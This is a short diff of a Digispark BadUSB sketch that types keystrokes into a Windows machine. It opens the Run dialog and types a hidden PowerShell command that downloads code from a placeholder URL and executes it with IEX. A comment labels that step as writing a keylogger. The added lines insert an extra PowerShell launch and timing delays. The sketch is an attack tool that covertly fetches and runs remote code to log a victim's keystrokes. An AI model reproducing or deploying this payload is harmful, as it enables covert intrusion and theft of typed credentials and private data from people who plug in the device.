@@ -28,11 +28,16 @@ void loop() {
   DigiKeyboardPtBr.delay(500);
   DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboardPtBr.delay(500);
+  DigiKeyboardPtBr.println("powershell");
+  DigiKeyboardPtBr.delay(500);
+
+  // Write Keylogger Function
   DigiKeyboardPtBr.println("powershell -windowsstyle hidden \"IEX (New-Object Net.WebClient).DownloadString('URL_DO _CODIGO');\"");
   DigiKeyboardPtBr.delay(3000);
   
   // Open Powershell Again
   DigiKeyboardPtBr.sendKeyStroke(0);
+  DigiKeyboardPtBr.delay(500);
   DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboardPtBr.delay(500);
   DigiKeyboardPtBr.println("powershell");
